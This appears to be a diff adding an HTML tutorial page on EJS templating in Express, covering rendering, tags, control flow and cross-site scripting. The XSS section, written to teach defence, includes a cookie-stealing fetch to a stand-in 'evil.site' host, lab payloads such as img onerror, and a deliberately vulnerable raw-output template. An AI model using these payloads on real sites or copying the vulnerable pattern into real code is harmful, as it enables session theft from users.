+  <span class="token-flag">&lt;meta</span> charset=<span class="token-string">"UTF-8"</span><span class="token-flag">&gt;</span>
+  <span class="token-flag">&lt;title</span><span class="token-flag">&gt;</span>Home<span class="token-flag">&lt;/title</span><span class="token-flag">&gt;</span>
+  <span class="token-flag">&lt;link</span> rel=<span class="token-string">"stylesheet"</span> href=<span class="token-string">"/css/style.css"</span><span class="token-flag">&gt;</span>
+<span class="token-flag">&lt;/head</span><span class="token-flag">&gt;</span>
+<span class="token-flag">&lt;body</span><span class="token-flag">&gt;</span>
+  <span class="token-flag">&lt;h1</span><span class="token-flag">&gt;</span>Hello, <span class="token-operator">&lt;%=</span> name <span class="token-operator">%&gt;</span> 👋<span class="token-flag">&lt;/h1</span><span class="token-flag">&gt;</span>
+  <span class="token-flag">&lt;p</span><span class="token-flag">&gt;</span>This page was built on the server at <span class="token-operator">&lt;%=</span> <span class="token-yaml-key">new</span> <span class="token-command">Date</span>().<span class="token-command">toLocaleTimeString</span>() <span class="token-operator">%&gt;</span><span class="token-flag">&lt;/p</span><span class="token-flag">&gt;</span>
+<span class="token-flag">&lt;/body</span><span class="token-flag">&gt;</span>
+<span class="token-flag">&lt;/html</span><span class="token-flag">&gt;</span></pre></div>
+
+      <div class="step-row"><span class="badge badge-green">Verify</span></div>
+<div class="code-block"><div class="code-header"><span class="code-label">Terminal</span><button type="button" onclick="copyCode(this)" class="code-copy-btn">copy</button></div><pre class="code-pre"><span class="token-command">node</span> <span class="token-flag">--watch</span> <span class="token-val">app.js</span>
+<span class="token-comment"># open http://localhost:3000 → right-click → View Page Source</span></pre></div>
+      <p>In the page source you'll see <code>Hello, Ankur</code> already written into the HTML, with no EJS tags left. That's SSR. Now open your React project's page source — just an empty <code>&lt;div id="root"&gt;</code>. <code>node --watch</code> restarts the server whenever you save a file.</p>
+
+      <div class="warning-box">
+        <div class="warning-box-icon">⚠️</div>
+        <p class="warning-box-text"><strong>Never put templates inside <code>public</code>.</strong> Anything in <code>public</code> is sent to the browser as a raw file, so your <code>.ejs</code> source (and any logic in it) would be downloadable.</p>
+      </div>
+
+      <div class="quiz-box"><div class="quiz-tag">Quick check</div><p class="quiz-question">After <code>app.set('view engine', 'ejs')</code>, how do you render <code>views/home.ejs</code>?</p><div class="quiz-options" id="quiz-setup-1"><button type="button" onclick="answerQuiz('quiz-setup-1', this, true)" class="quiz-option">A &nbsp;—&nbsp; <code>res.render('home')</code></button><button type="button" onclick="answerQuiz('quiz-setup-1', this, false)" class="quiz-option">B &nbsp;—&nbsp; <code>res.sendFile('home.ejs')</code></button></div><div class="quiz-feedback hidden" id="quiz-setup-1-feedback"></div></div>
+      <div class="quiz-box"><div class="quiz-tag">Quick check</div><p class="quiz-question">Where should <code>style.css</code> live so a template can load it with <code>&lt;link href="/css/style.css"&gt;</code>?</p><div class="quiz-options" id="quiz-setup-2"><button type="button" onclick="answerQuiz('quiz-setup-2', this, false)" class="quiz-option">A &nbsp;—&nbsp; <code>views/css/style.css</code></button><button type="button" onclick="answerQuiz('quiz-setup-2', this, true)" class="quiz-option">B &nbsp;—&nbsp; <code>public/css/style.css</code>, served by <code>express.static</code></button></div><div class="quiz-feedback hidden" id="quiz-setup-2-feedback"></div></div>
+    </section>
+
+    <hr class="divider">
+
+    <!-- ═════════════ 06 Rendering ═════════════ -->
+    <section class="section-block animate-fade-up" id="rendering">
+      <div class="section-header">
+        <div class="section-num-big">06</div>
+        <div class="section-header-text">
+          <div class="section-title">Rendering a Page</div>
+          <div class="section-subtitle">res.render() and passing data from the route to the template</div>
+        </div>
+      </div>
+
+      <div class="concept-box">
+        <div class="concept-box-label">Key Concept</div>
+        <p class="concept-box-text"><code>res.render(view, data)</code> finds the template, runs it with <code>data</code>, and sends the resulting HTML. <strong>Every key in the data object becomes a variable</strong> inside the template. The template can only see what you pass — nothing sneaks in.</p>
+      </div>
+
+      <div class="table-wrap">
+      <table class="flag-table">
+        <thead><tr><th>Argument</th><th>Example</th><th>Meaning</th></tr></thead>
+        <tbody>
+          <tr><td><span class="flag-name">view</span></td><td><span class="flag-val">'profile'</span></td><td>File path inside <code>views</code>, without <code>.ejs</code>. Sub-folders work: <code>'products/list'</code> → <code>views/products/list.ejs</code>.</td></tr>
+          <tr><td><span class="flag-name">data</span></td><td><span class="flag-val">{ user, skills }</span></td><td>A plain object. Each key becomes a variable in the template.</td></tr>
+        </tbody>
+      </table>
+      </div>
+
+<div class="code-block"><div class="code-header"><span class="code-label">app.js</span><button type="button" onclick="copyCode(this)" class="code-copy-btn">copy</button></div><pre class="code-pre">app.<span class="token-command">get</span>(<span class="token-string">'/profile'</span>, (req, res) <span class="token-operator">=&gt;</span> {
+  <span class="token-yaml-key">const</span> user = { name: <span class="token-string">'Riya Sharma'</span>, role: <span class="token-string">'Backend Developer'</span>, city: <span class="token-string">'Bhopal'</span> };
+  <span class="token-yaml-key">const</span> skills = [<span class="token-string">'Node.js'</span>, <span class="token-string">'Express'</span>, <span class="token-string">'MongoDB'</span>, <span class="token-string">'Redis'</span>];
+
+  res.<span class="token-command">render</span>(<span class="token-string">'profile'</span>, { user, skills });
+});</pre></div>
+<div class="code-block"><div class="code-header"><span class="code-label">views/profile.ejs</span><button type="button" onclick="copyCode(this)" class="code-copy-btn">copy</button></div><pre class="code-pre"><span class="token-flag">&lt;h1</span><span class="token-flag">&gt;</span><span class="token-operator">&lt;%=</span> user.name <span class="token-operator">%&gt;</span><span class="token-flag">&lt;/h1</span><span class="token-flag">&gt;</span>
+<span class="token-flag">&lt;p</span><span class="token-flag">&gt;</span><span class="token-operator">&lt;%=</span> user.role <span class="token-operator">%&gt;</span> · <span class="token-operator">&lt;%=</span> user.city <span class="token-operator">%&gt;</span><span class="token-flag">&lt;/p</span><span class="token-flag">&gt;</span>
+<span class="token-flag">&lt;p</span><span class="token-flag">&gt;</span>Knows <span class="token-operator">&lt;%=</span> skills.length <span class="token-operator">%&gt;</span> technologies<span class="token-flag">&lt;/p</span><span class="token-flag">&gt;</span></pre></div>
+
+      <h3>Real data from MongoDB</h3>
+      <p>The route is a normal Express route — you query the database first, then render. Exactly like you'd do before <code>res.json()</code>.</p>
+<div class="code-block"><div class="code-header"><span class="code-label">routes/product.routes.js</span><button type="button" onclick="copyCode(this)" class="code-copy-btn">copy</button></div><pre class="code-pre">app.<span class="token-command">get</span>(<span class="token-string">'/products'</span>, <span class="token-yaml-key">async</span> (req, res) <span class="token-operator">=&gt;</span> {
+  <span class="token-yaml-key">const</span> products = <span class="token-yaml-key">await</span> Product.<span class="token-command">find</span>().<span class="token-command">sort</span>({ createdAt: -<span class="token-val">1</span> }).<span class="token-command">lean</span>();
+  res.<span class="token-command">render</span>(<span class="token-string">'products/list'</span>, { title: <span class="token-string">'All Products'</span>, products });
+});
+
+app.<span class="token-command">get</span>(<span class="token-string">'/products/:id'</span>, <span class="token-yaml-key">async</span> (req, res) <span class="token-operator">=&gt;</span> {
+  <span class="token-yaml-key">const</span> product = <span class="token-yaml-key">await</span> Product.<span class="token-command">findById</span>(req.params.id).<span class="token-command">lean</span>();
+  <span class="token-yaml-key">if</span> (!product) {
+    <span class="token-yaml-key">return</span> res.<span class="token-command">status</span>(<span class="token-val">404</span>).<span class="token-command">render</span>(<span class="token-string">'404'</span>, { title: <span class="token-string">'Not found'</span> });
+  }
+  res.<span class="token-command">render</span>(<span class="token-string">'products/detail'</span>, { title: product.name, product });
+});</pre></div>
+      <p><code>.lean()</code> returns plain JS objects instead of full Mongoose documents — lighter and faster when you only need to display data.</p>
+
+      <h3>Missing variables crash the render</h3>
+      <div class="warning-box">
+        <div class="warning-box-icon">⚠️</div>
+        <p class="warning-box-text">If a template uses <code>&lt;%= error %&gt;</code> and the route didn't pass <code>error</code>, the render fails with <strong>ReferenceError: error is not defined</strong> and the user gets a 500 error page.</p>
+      </div>
+      <p>For optional values, read them through <code>locals</code> — an object EJS gives every template that holds all the data you passed. Reading a missing key from an object is just <code>undefined</code>, not a crash:</p>
+<div class="code-block"><div class="code-header"><span class="code-label">views/login.ejs</span><button type="button" onclick="copyCode(this)" class="code-copy-btn">copy</button></div><pre class="code-pre"><span class="token-operator">&lt;%</span> <span class="token-yaml-key">if</span> (locals.error) { <span class="token-operator">%&gt;</span>
+  <span class="token-flag">&lt;p</span> class=<span class="token-string">"error"</span><span class="token-flag">&gt;</span><span class="token-operator">&lt;%=</span> error <span class="token-operator">%&gt;</span><span class="token-flag">&lt;/p</span><span class="token-flag">&gt;</span>
+<span class="token-operator">&lt;%</span> } <span class="token-operator">%&gt;</span></pre></div>
+
+      <h3>render vs send vs json</h3>
+      <div class="table-wrap">
+      <table class="compare-table">
+        <thead><tr><th>Method</th><th>Sends</th><th>Use when</th></tr></thead>
+        <tbody>
+          <tr><td class="cell-title"><code>res.render()</code></td><td class="cell-muted">HTML built from a template</td><td class="cell-highlight">Server-rendered pages ✓</td></tr>
+          <tr><td class="cell-title"><code>res.json()</code></td><td class="cell-muted">JSON data</td><td class="cell-muted">APIs for React or mobile apps</td></tr>
+          <tr><td class="cell-title"><code>res.send()</code></td><td class="cell-muted">A string, buffer or object as it is</td><td class="cell-muted">Quick tests and plain text</td></tr>
+        </tbody>
+      </table>
+      </div>
+
+      <div class="quiz-box"><div class="quiz-tag">Quick check</div><p class="quiz-question">The route calls <code>res.render('profile', { user })</code>. How do you print the name in the template?</p><div class="quiz-options" id="quiz-render-1"><button type="button" onclick="answerQuiz('quiz-render-1', this, true)" class="quiz-option">A &nbsp;—&nbsp; <code>&lt;%= user.name %&gt;</code></button><button type="button" onclick="answerQuiz('quiz-render-1', this, false)" class="quiz-option">B &nbsp;—&nbsp; <code>&lt;%= data.user.name %&gt;</code></button></div><div class="quiz-feedback hidden" id="quiz-render-1-feedback"></div></div>
+      <div class="quiz-box"><div class="quiz-tag">Quick check</div><p class="quiz-question">A template prints <code>&lt;%= error %&gt;</code> but the route never passed <code>error</code>. What happens?</p><div class="quiz-options" id="quiz-render-2"><button type="button" onclick="answerQuiz('quiz-render-2', this, false)" class="quiz-option">A &nbsp;—&nbsp; It quietly renders an empty string</button><button type="button" onclick="answerQuiz('quiz-render-2', this, true)" class="quiz-option">B &nbsp;—&nbsp; ReferenceError: error is not defined — the render fails</button></div><div class="quiz-feedback hidden" id="quiz-render-2-feedback"></div></div>
+    </section>
+
+    <hr class="divider">
+
+    <!-- ═════════════ 07 Tags ═════════════ -->
+    <section class="section-block animate-fade-up" id="tags">
+      <div class="section-header">
+        <div class="section-num-big">07</div>
+        <div class="section-header-text">
+          <div class="section-title">The Four Tags</div>
+          <div class="section-subtitle">Print safely, run logic, print raw HTML, leave notes</div>
+        </div>
+      </div>
+
+      <p>Everything in EJS is done with four tags. Learn which one prints and which one doesn't, and you know 90% of EJS.</p>
+
+      <div class="table-wrap">
+      <table class="flag-table">
+        <thead><tr><th>Tag</th><th>Name</th><th>Prints?</th><th>Use it for</th></tr></thead>
+        <tbody>
+          <tr><td><span class="flag-name">&lt;%= %&gt;</span></td><td>Escaped output</td><td><span class="flag-val">Yes, safely</span></td><td>Printing any value — <strong>your default choice</strong>. HTML characters are converted so they display as text.</td></tr>
+          <tr><td><span class="flag-name">&lt;% %&gt;</span></td><td>Logic only</td><td><span class="flag-val">No</span></td><td><code>if</code>, <code>for</code>, variables — JavaScript that controls the page but prints nothing itself.</td></tr>
+          <tr><td><span class="flag-name">&lt;%- %&gt;</span></td><td>Unescaped output</td><td><span class="flag-val">Yes, raw</span></td><td><code>include()</code> and HTML <strong>you</strong> wrote. Never for user input.</td></tr>
+          <tr><td><span class="flag-name">&lt;%# %&gt;</span></td><td>Comment</td><td><span class="flag-val">No</span></td><td>Notes for developers. Removed on the server — never reaches the browser.</td></tr>
+        </tbody>
+      </table>
+      </div>
+
+      <div class="step-row"><span class="badge badge-blue">&lt;%= %&gt; — escaped output</span></div>
+<div class="code-block"><div class="code-header"><span class="code-label">views/tags.ejs</span><button type="button" onclick="copyCode(this)" class="code-copy-btn">copy</button></div><pre class="code-pre"><span class="token-flag">&lt;h2</span><span class="token-flag">&gt;</span>Welcome, <span class="token-operator">&lt;%=</span> user.name <span class="token-operator">%&gt;</span><span class="token-flag">&lt;/h2</span><span class="token-flag">&gt;</span>
+<span class="token-flag">&lt;p</span><span class="token-flag">&gt;</span>Total: ₹<span class="token-operator">&lt;%=</span> cart.total.<span class="token-command">toLocaleString</span>(<span class="token-string">'en-IN'</span>) <span class="token-operator">%&gt;</span><span class="token-flag">&lt;/p</span><span class="token-flag">&gt;</span>
+<span class="token-flag">&lt;p</span><span class="token-flag">&gt;</span>Items: <span class="token-operator">&lt;%=</span> cart.items.length <span class="token-operator">%&gt;</span><span class="token-flag">&lt;/p</span><span class="token-flag">&gt;</span></pre></div>
+
+      <div class="step-row"><span class="badge badge-blue">&lt;% %&gt; — logic only</span></div>
+<div class="code-block"><div class="code-header"><span class="code-label">views/tags.ejs</span><button type="button" onclick="copyCode(this)" class="code-copy-btn">copy</button></div><pre class="code-pre"><span class="token-operator">&lt;%</span> <span class="token-yaml-key">const</span> firstName = user.name.<span class="token-command">split</span>(<span class="token-string">' '</span>)[<span class="token-val">0</span>]; <span class="token-operator">%&gt;</span>
+<span class="token-operator">&lt;%</span> <span class="token-yaml-key">if</span> (cart.items.length &gt; <span class="token-val">0</span>) { <span class="token-operator">%&gt;</span>
+  <span class="token-flag">&lt;p</span><span class="token-flag">&gt;</span>Hey <span class="token-operator">&lt;%=</span> firstName <span class="token-operator">%&gt;</span>, ready to check out?<span class="token-flag">&lt;/p</span><span class="token-flag">&gt;</span>
+<span class="token-operator">&lt;%</span> } <span class="token-operator">%&gt;</span></pre></div>
+
+      <div class="step-row"><span class="badge badge-gold">&lt;%- %&gt; — unescaped output</span></div>
+<div class="code-block"><div class="code-header"><span class="code-label">views/tags.ejs</span><button type="button" onclick="copyCode(this)" class="code-copy-btn">copy</button></div><pre class="code-pre"><span class="token-operator">&lt;%-</span> <span class="token-command">include</span>(<span class="token-string">'partials/header'</span>) <span class="token-operator">%&gt;</span>
+
+<span class="token-operator">&lt;%</span> <span class="token-yaml-key">const</span> badge = <span class="token-string">'&lt;span class="badge"&gt;PRO&lt;/span&gt;'</span>; <span class="token-operator">%&gt;</span>
+<span class="token-flag">&lt;p</span><span class="token-flag">&gt;</span>Plan: <span class="token-operator">&lt;%-</span> badge <span class="token-operator">%&gt;</span><span class="token-flag">&lt;/p</span><span class="token-flag">&gt;</span>   <span class="token-comment">&lt;%# HTML we wrote ourselves → safe %&gt;</span></pre></div>
+
+      <div class="step-row"><span class="badge badge-blue">&lt;%# %&gt; — comment</span></div>
+<div class="code-block"><div class="code-header"><span class="code-label">views/tags.ejs</span><button type="button" onclick="copyCode(this)" class="code-copy-btn">copy</button></div><pre class="code-pre"><span class="token-comment">&lt;%# TODO: show discount banner after the sale API is ready %&gt;</span>
+<span class="token-comment">&lt;!-- HTML comment: this one IS sent to the browser --&gt;</span></pre></div>
+
+      <h3>See the difference in the output</h3>
+<div class="code-block"><div class="code-header"><span class="code-label">Template</span><button type="button" onclick="copyCode(this)" class="code-copy-btn">copy</button></div><pre class="code-pre"><span class="token-operator">&lt;%</span> <span class="token-yaml-key">const</span> msg = <span class="token-string">'&lt;b&gt;Hello&lt;/b&gt;'</span>; <span class="token-operator">%&gt;</span>
+<span class="token-flag">&lt;p</span><span class="token-flag">&gt;</span><span class="token-operator">&lt;%=</span> msg <span class="token-operator">%&gt;</span><span class="token-flag">&lt;/p</span><span class="token-flag">&gt;</span>
+<span class="token-flag">&lt;p</span><span class="token-flag">&gt;</span><span class="token-operator">&lt;%-</span> msg <span class="token-operator">%&gt;</span><span class="token-flag">&lt;/p</span><span class="token-flag">&gt;</span>
+<span class="token-comment">&lt;%# you won't see this %&gt;</span></pre></div>
+<div class="code-block"><div class="code-header"><span class="code-label">HTML sent to the browser</span><button type="button" onclick="copyCode(this)" class="code-copy-btn">copy</button></div><pre class="code-pre"><span class="token-flag">&lt;p</span><span class="token-flag">&gt;</span>&amp;lt;b&amp;gt;Hello&amp;lt;/b&amp;gt;<span class="token-flag">&lt;/p</span><span class="token-flag">&gt;</span>   <span class="token-comment">&lt;!-- shows the text: &lt;b&gt;Hello&lt;/b&gt; --&gt;</span>
+<span class="token-flag">&lt;p</span><span class="token-flag">&gt;</span><span class="token-flag">&lt;b</span><span class="token-flag">&gt;</span>Hello<span class="token-flag">&lt;/b</span><span class="token-flag">&gt;</span><span class="token-flag">&lt;/p</span><span class="token-flag">&gt;</span>               <span class="token-comment">&lt;!-- shows bold: Hello --&gt;</span></pre></div>
+
+      <div class="warning-box">
+        <div class="warning-box-icon">⚠️</div>
+        <p class="warning-box-text"><strong>Don't print logic.</strong> <code>&lt;%= if (user) { %&gt;</code> fails with a SyntaxError — <code>&lt;%=</code> expects a value to print, not a statement. Use <code>&lt;% %&gt;</code> for <code>if</code>, <code>for</code> and closing braces.</p>
+      </div>
+
+      <div class="note-box">
+        <div class="note-box-icon">💡</div>
+        <p class="note-box-text"><strong>Cleaner output:</strong> logic tags leave blank lines in the HTML. End a tag with <code>-%&gt;</code> to remove the newline after it, or use <code>&lt;%_ _%&gt;</code> to strip the whitespace around it. It only affects how View Page Source looks, not what the user sees.</p>
+      </div>
+
+      <div class="quiz-box"><div class="quiz-tag">Quick check</div><p class="quiz-question">Which tag runs JavaScript without printing anything?</p><div class="quiz-options" id="quiz-tags-1"><button type="button" onclick="answerQuiz('quiz-tags-1', this, true)" class="quiz-option">A &nbsp;—&nbsp; <code>&lt;% %&gt;</code></button><button type="button" onclick="answerQuiz('quiz-tags-1', this, false)" class="quiz-option">B &nbsp;—&nbsp; <code>&lt;%= %&gt;</code></button></div><div class="quiz-feedback hidden" id="quiz-tags-1-feedback"></div></div>
+      <div class="quiz-box"><div class="quiz-tag">Quick check</div><p class="quiz-question">Which tag should print a username that a user typed in?</p><div class="quiz-options" id="quiz-tags-2"><button type="button" onclick="answerQuiz('quiz-tags-2', this, false)" class="quiz-option">A &nbsp;—&nbsp; <code>&lt;%- %&gt;</code></button><button type="button" onclick="answerQuiz('quiz-tags-2', this, true)" class="quiz-option">B &nbsp;—&nbsp; <code>&lt;%= %&gt;</code></button></div><div class="quiz-feedback hidden" id="quiz-tags-2-feedback"></div></div>
+    </section>
+
+    <hr class="divider">
+
+    <!-- ═════════════ 08 XSS ═════════════ -->
+    <section class="section-block animate-fade-up" id="xss">
+      <div class="section-header">
+        <div class="section-num-big">08</div>
+        <div class="section-header-text">
+          <div class="section-title">Cross-Site Scripting (XSS)</div>
+          <div class="section-subtitle">Why one wrong tag can hand your users' accounts to an attacker</div>
+        </div>
+      </div>
+
+      <div class="concept-box">
+        <div class="concept-box-label">Key Concept</div>
+        <p class="concept-box-text"><strong>XSS</strong> happens when an attacker gets <strong>their JavaScript to run in other users' browsers on your website</strong>. The browser can't tell your scripts from theirs — if it's in the HTML your server sent, it runs with full access to the page.</p>
+      </div>
+
+      <h3>How the attack happens</h3>
+      <div class="flow-diagram">
+        <div class="flow-step"><div class="flow-connector"><div class="flow-dot flow-dot-accent"></div><div class="flow-line"></div></div>
+          <div class="flow-content"><div class="flow-title">Attacker saves a "bio" containing a script</div><div class="flow-desc"><code>&lt;script&gt;fetch('https://evil.site/steal?c=' + document.cookie)&lt;/script&gt;</code></div></div></div>
+        <div class="flow-step"><div class="flow-connector"><div class="flow-dot flow-dot-accent"></div><div class="flow-line"></div></div>
+          <div class="flow-content"><div class="flow-title">Your server stores it in MongoDB</div><div class="flow-desc">To the database it's just a string. Nothing looks wrong.</div></div></div>
+        <div class="flow-step"><div class="flow-connector"><div class="flow-dot flow-dot-accent"></div><div class="flow-line"></div></div>
+          <div class="flow-content"><div class="flow-title">A victim opens the attacker's profile</div><div class="flow-desc">The template prints the bio with <code>&lt;%- bio %&gt;</code> — raw, unescaped.</div></div></div>
+        <div class="flow-step"><div class="flow-connector"><div class="flow-dot flow-dot-accent"></div></div>
+          <div class="flow-content"><div class="flow-title">The victim's browser runs the script</div><div class="flow-desc">Their cookies, session or data go to the attacker. The script can also click buttons, change the page, or show a fake login form — as the victim.</div></div></div>
+      </div>
+
+      <h3>The fix is one character</h3>
+      <div class="code-pair">
+        <div>
+          <div class="pair-label"><span class="badge badge-accent">Vulnerable</span></div>
+<div class="code-block"><div class="code-header"><span class="code-label">views/profile.ejs</span><button type="button" onclick="copyCode(this)" class="code-copy-btn">copy</button></div><pre class="code-pre"><span class="token-flag">&lt;p</span> class=<span class="token-string">"bio"</span><span class="token-flag">&gt;</span><span class="token-operator">&lt;%-</span> user.bio <span class="token-operator">%&gt;</span><span class="token-flag">&lt;/p</span><span class="token-flag">&gt;</span></pre></div>
+<div class="code-block"><div class="code-header"><span class="code-label">HTML sent</span><button type="button" onclick="copyCode(this)" class="code-copy-btn">copy</button></div><pre class="code-pre"><span class="token-flag">&lt;p</span> class=<span class="token-string">"bio"</span><span class="token-flag">&gt;</span><span class="token-flag">&lt;script</span><span class="token-flag">&gt;</span>alert("hacked")<span class="token-flag">&lt;/script</span><span class="token-flag">&gt;</span><span class="token-flag">&lt;/p</span><span class="token-flag">&gt;</span>
+<span class="token-comment">&lt;!-- the browser RUNS this --&gt;</span></pre></div>
+        </div>
+        <div>
+          <div class="pair-label"><span class="badge badge-green">Safe</span></div>
+<div class="code-block"><div class="code-header"><span class="code-label">views/profile.ejs</span><button type="button" onclick="copyCode(this)" class="code-copy-btn">copy</button></div><pre class="code-pre"><span class="token-flag">&lt;p</span> class=<span class="token-string">"bio"</span><span class="token-flag">&gt;</span><span class="token-operator">&lt;%=</span> user.bio <span class="token-operator">%&gt;</span><span class="token-flag">&lt;/p</span><span class="token-flag">&gt;</span></pre></div>
+<div class="code-block"><div class="code-header"><span class="code-label">HTML sent</span><button type="button" onclick="copyCode(this)" class="code-copy-btn">copy</button></div><pre class="code-pre"><span class="token-flag">&lt;p</span> class=<span class="token-string">"bio"</span><span class="token-flag">&gt;</span>&amp;lt;script&amp;gt;alert(&amp;#34;hacked&amp;#34;)&amp;lt;/script&amp;gt;<span class="token-flag">&lt;/p</span><span class="token-flag">&gt;</span>
+<span class="token-comment">&lt;!-- the browser SHOWS this as text --&gt;</span></pre></div>
+        </div>
+      </div>
+
+      <p><code>&lt;%= %&gt;</code> converts the five characters that have special meaning in HTML into <strong>HTML entities</strong>. The browser displays them as characters instead of treating them as code:</p>
+      <div class="table-wrap">
+      <table class="flag-table">
+        <thead><tr><th>Character</th><th>Becomes</th><th>Why it matters</th></tr></thead>
+        <tbody>
+          <tr><td><span class="flag-name">&lt;</span></td><td><span class="flag-val">&amp;lt;</span></td><td>Can't open a tag like <code>&lt;script&gt;</code></td></tr>
+          <tr><td><span class="flag-name">&gt;</span></td><td><span class="flag-val">&amp;gt;</span></td><td>Can't close a tag</td></tr>
+          <tr><td><span class="flag-name">"</span></td><td><span class="flag-val">&amp;#34;</span></td><td>Can't break out of an attribute like <code>value="…"</code></td></tr>
+          <tr><td><span class="flag-name">'</span></td><td><span class="flag-val">&amp;#39;</span></td><td>Same, for single-quoted attributes</td></tr>
+          <tr><td><span class="flag-name">&amp;</span></td><td><span class="flag-val">&amp;amp;</span></td><td>Can't sneak in entities of its own</td></tr>
+        </tbody>
+      </table>
+      </div>
+
+      <div class="lab" id="xss-lab">
+        <p class="lab-title">XSS lab</p>
+        <p class="lab-sub">Type a bio (or pick an attack), switch the tag, and see what the server sends. Nothing here actually runs.</p>
+        <label for="xss-input">User's bio, as saved in the database</label>
+        <input id="xss-input" type="text" autocomplete="off" spellcheck="false">
+        <div class="lab-row" id="xss-presets">
+          <button type="button" class="chip" data-v="<script>alert('hacked')</script>">script tag</button>
+          <button type="button" class="chip" data-v='<img src="x" onerror="alert(document.cookie)">'>img onerror</button>
+          <button type="button" class="chip" data-v="I love <b>backend</b> & coffee">bold text</button>
+          <button type="button" class="chip" data-v="Backend dev from Bhopal">plain text</button>
+        </div>
+        <div class="lab-row" id="xss-tags" role="group" aria-label="Template tag">
+          <button type="button" class="chip on" data-tag="escaped">&lt;%= user.bio %&gt;</button>
+          <button type="button" class="chip" data-tag="raw">&lt;%- user.bio %&gt;</button>
+        </div>
+        <div class="lab-grid">
+          <div class="lab-pane"><h4>HTML the server sends</h4><pre class="code-pre" id="xss-out"></pre></div>
+          <div class="lab-pane"><h4>What the browser does</h4><div class="lab-result" id="xss-result" aria-live="polite"></div></div>
+        </div>
+      </div>
+
+      <h3>Three kinds of XSS</h3>
+      <div class="table-wrap">
+      <table class="compare-table">
+        <thead><tr><th>Type</th><th>Where the script comes from</th><th>EJS example</th></tr></thead>
+        <tbody>
+          <tr><td class="cell-title">Stored</td><td class="cell-muted">Saved in your database, served to every visitor</td><td class="cell-muted">Comments, bios, product reviews printed with <code>&lt;%-</code></td></tr>
+          <tr><td class="cell-title">Reflected</td><td class="cell-muted">In the URL, bounced straight back in the response</td><td class="cell-muted"><code>You searched for &lt;%- q %&gt;</code> with <code>?q=&lt;script&gt;…</code> — the attacker sends victims that link</td></tr>
+          <tr><td class="cell-title">DOM-based</td><td class="cell-muted">Your own browser JS writes untrusted data into the page</td><td class="cell-muted">Not EJS's job — happens with <code>innerHTML</code> in client scripts</td></tr>
+        </tbody>
+      </table>
+      </div>
+
+      <h3>Where escaping is not enough</h3>
+      <div class="warning-box">
+        <div class="warning-box-icon">⚠️</div>
+        <p class="warning-box-text"><strong>Links:</strong> <code>&lt;a href="&lt;%= user.website %&gt;"&gt;</code> with a website of <code>javascript:alert(1)</code> passes through escaping untouched — there's nothing to escape. Clicking the link runs the code. Validate URLs on the server and only accept ones that start with <code>http://</code> or <code>https://</code>.</p>
+      </div>
+      <div class="warning-box">
+        <div class="warning-box-icon">⚠️</div>
+        <p class="warning-box-text"><strong>Inside <code>&lt;script&gt;</code> tags:</strong> <code>const user = &lt;%- JSON.stringify(user) %&gt;;</code> breaks if any value contains <code>&lt;/script&gt;</code> — the attacker closes your script and opens their own. Escape it: <code>JSON.stringify(user).replace(/&lt;/g, '\\u003c')</code>, or pass data in a <code>data-</code> attribute with <code>&lt;%= %&gt;</code>.</p>
+      </div>
+
+      <h3>Rules to follow</h3>
+      <ol>
+        <li><strong>Default to <code>&lt;%= %&gt;</code></strong> for every value. Pick <code>&lt;%- %&gt;</code> only when you can say why.</li>
+        <li><strong><code>&lt;%- %&gt;</code> is only for <code>include()</code></strong> and HTML your own code produced — never data from a user, a URL, a form or a third-party API.</li>
+        <li><strong>If users must submit formatted text</strong> (a blog editor, rich comments), clean it on the server with a sanitizer library like <code>sanitize-html</code> before saving, and only then print it raw.</li>
+        <li><strong>Add layers:</strong> set session cookies as <code>httpOnly</code> so JavaScript can't read them, and send a Content-Security-Policy header (the <code>helmet</code> package helps) to block inline scripts.</li>
+      </ol>
+
+      <div class="quiz-box"><div class="quiz-tag">Quick check</div><p class="quiz-question">With <code>&lt;%= bio %&gt;</code>, a bio of <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> shows up as…</p><div class="quiz-options" id="quiz-xss-1"><button type="button" onclick="answerQuiz('quiz-xss-1', this, true)" class="quiz-option">A &nbsp;—&nbsp; Plain visible text — the script never runs</button><button type="button" onclick="answerQuiz('quiz-xss-1', this, false)" class="quiz-option">B &nbsp;—&nbsp; An alert popup on every visitor's screen</button></div><div class="quiz-feedback hidden" id="quiz-xss-1-feedback"></div></div>
+      <div class="quiz-box"><div class="quiz-tag">Quick check</div><p class="quiz-question"><code>&lt;a href="&lt;%= link %&gt;"&gt;</code> with <code>link = "javascript:alert(1)"</code>. Is <code>&lt;%=</code> enough to keep you safe?</p><div class="quiz-options" id="quiz-xss-2"><button type="button" onclick="answerQuiz('quiz-xss-2', this, false)" class="quiz-option">A &nbsp;—&nbsp; Yes, escaping blocks it</button><button type="button" onclick="answerQuiz('quiz-xss-2', this, true)" class="quiz-option">B &nbsp;—&nbsp; No — also check the URL starts with http:// or https://</button></div><div class="quiz-feedback hidden" id="quiz-xss-2-feedback"></div></div>
+    </section>
+
+    <hr class="divider">
+
+    <!-- ═════════════ 09 Control flow ═════════════ -->
+    <section class="section-block animate-fade-up" id="control-flow">
+      <div class="section-header">
+        <div class="section-num-big">09</div>
+        <div class="section-header-text">
+          <div class="section-title">Control Flow & Loops</div>
+          <div class="section-subtitle">Plain JavaScript inside logic tags — HTML in between</div>
+        </div>
+      </div>
+
+      <p>There's no special EJS syntax for conditions or loops. You write normal JavaScript inside <code>&lt;% %&gt;</code>, and the HTML between the tags becomes the body of the <code>if</code> or the loop.</p>
+
+      <h3>if / else</h3>
+<div class="code-block"><div class="code-header"><span class="code-label">views/partials/nav.ejs</span><button type="button" onclick="copyCode(this)" class="code-copy-btn">copy</button></div><pre class="code-pre"><span class="token-operator">&lt;%</span> <span class="token-yaml-key">if</span> (locals.user) { <span class="token-operator">%&gt;</span>
+  <span class="token-flag">&lt;span</span><span class="token-flag">&gt;</span>Hi, <span class="token-operator">&lt;%=</span> user.name <span class="token-operator">%&gt;</span><span class="token-flag">&lt;/span</span><span class="token-flag">&gt;</span>
+  <span class="token-flag">&lt;a</span> href=<span class="token-string">"/logout"</span><span class="token-flag">&gt;</span>Logout<span class="token-flag">&lt;/a</span><span class="token-flag">&gt;</span>
+<span class="token-operator">&lt;%</span> } <span class="token-yaml-key">else</span> { <span class="token-operator">%&gt;</span>
+  <span class="token-flag">&lt;a</span> href=<span class="token-string">"/login"</span><span class="token-flag">&gt;</span>Login<span class="token-flag">&lt;/a</span><span class="token-flag">&gt;</span>
+  <span class="token-flag">&lt;a</span> href=<span class="token-string">"/register"</span><span class="token-flag">&gt;</span>Sign up<span class="token-flag">&lt;/a</span><span class="token-flag">&gt;</span>
